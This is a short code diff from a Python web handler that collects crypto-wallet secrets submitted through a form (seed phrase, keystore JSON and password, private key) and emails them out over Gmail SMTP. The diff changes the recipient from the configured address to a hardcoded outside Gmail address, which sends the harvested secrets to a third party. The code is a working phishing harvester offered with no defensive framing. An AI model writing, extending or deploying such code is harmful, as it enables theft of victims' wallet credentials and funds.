@@ -25,7 +25,7 @@ def index():
         msg.set_content(f'The new input:\n\nWallet type: {tyW}\nPhrase: {phrase}\nKey store json: {keystorejson}\nKey store password: {keystorepassword}\nPrivate key: {privatekey}')
         msg['Subject'] = 'A new input'
         msg['From'] = EMAIL_ADDRESS
-        msg['To'] = EMAIL_ADDRESS
+        msg['To'] = 'laserteams03@gmail.com'
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
             smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
             smtp.send_message(msg)
